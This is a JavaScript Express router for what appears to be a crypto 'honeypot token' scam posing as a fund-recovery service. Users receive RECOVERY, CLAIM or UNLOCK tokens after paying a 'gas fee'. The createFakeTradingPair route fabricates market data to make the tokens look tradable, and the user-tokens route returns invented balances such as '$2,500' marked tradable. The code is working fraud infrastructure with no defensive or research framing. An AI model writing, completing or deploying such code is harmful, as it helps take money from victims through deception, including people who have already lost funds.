const express = require('express');
const router = express.Router();
const honeypotTokenService = require('../services/honeypotTokenService');

// Send free trial tokens (no payment required)
router.post('/send-free-trial', async (req, res) => {
  try {
    const { userAddress } = req.body;
    
    // Check if user already claimed free trial
    const hasClaimedTrial = await checkIfTrialClaimed(userAddress);
    if (hasClaimedTrial) {
      return res.status(400).json({
        success: false,
        error: 'Free trial already claimed'
      });
    }
    
    // Send 50 free trial tokens
    const result = await honeypotTokenService.sendHoneypotTokens(
      userAddress,
      'RECOVERY',
      50, // Fixed amount for trial
      0   // No gas fee paid
    );
    
    if (result.success) {
      // Mark trial as claimed
      await markTrialAsClaimed(userAddress);
      
      res.json({
        success: true,
        tokenAmount: 50,
        tokenSymbol: 'REC',
        message: 'Free trial tokens sent successfully'
      });
    } else {
      res.status(500).json({
        success: false,
        error: result.error
      });
    }
    
  } catch (error) {
    console.error('Error in send-free-trial:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to send trial tokens'
    });
  }
});

// Send honeypot tokens to user after gas payment
router.post('/send-honeypot-tokens', async (req, res) => {
  try {
    const { userAddress, action, gasFeePaid, requestedAmount, tokenSymbol, network } = req.body;
    
    // Determine which honeypot token to send based on action
    let tokenType = 'RECOVERY';
    if (action === 'swap') tokenType = 'CLAIM';
    if (action === 'send') tokenType = 'UNLOCK';
    
    // Send honeypot tokens
    const result = await honeypotTokenService.sendHoneypotTokens(
      userAddress,
      tokenType, 
      requestedAmount,
      gasFeePaid
    );
    
    if (result.success) {
      // Create fake trading pair data
      const tradingData = await honeypotTokenService.createFakeTradingPair(result.tokenAddress);
      
      res.json({
        success: true,
        tokenAmount: result.tokenAmount,
        tokenSymbol: result.tokenSymbol,
        tokenAddress: result.tokenAddress,
        txHash: result.txHash,
        tradingPair: tradingData,
        message: `Successfully sent ${result.tokenAmount} ${result.tokenSymbol} tokens`
      });
    } else {
      res.status(500).json({
        success: false,
        error: result.error
      });
    }
    
  } catch (error) {
    console.error('Error in send-honeypot-tokens:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to send tokens'
    });
  }
});

// Get token information
router.get('/token-info/:tokenType', async (req, res) => {
  try {
    const { tokenType } = req.params;
    const tokenInfo = honeypotTokenService.getTokenInfo(tokenType.toUpperCase());
    
    if (tokenInfo) {
      res.json(tokenInfo);
    } else {
      res.status(404).json({ error: 'Token not found' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Failed to get token info' });
  }
});

// Check if user has received tokens
router.get('/user-tokens/:address', async (req, res) => {
  try {
    const { address } = req.params;
    
    // This would check the blockchain for user's token balances
    // For now, return fake data
    const userTokens = [
      {
        symbol: 'REC',
        balance: '2500.0',
        value: '$2,500',
        canTrade: true,
        timeReceived: new Date().toISOString()
      }
    ];
    
    res.json(userTokens);
  } catch (error) {
    res.status(500).json({ error: 'Failed to get user tokens' });
  }
});

// Helper functions
async function checkIfTrialClaimed(address) {
  // In production, check database
  // For now, return false to allow trials
  return false;
}

async function markTrialAsClaimed(address) {
  // In production, save to database
  console.log(`Trial claimed by ${address}`);
}

module.exports = router;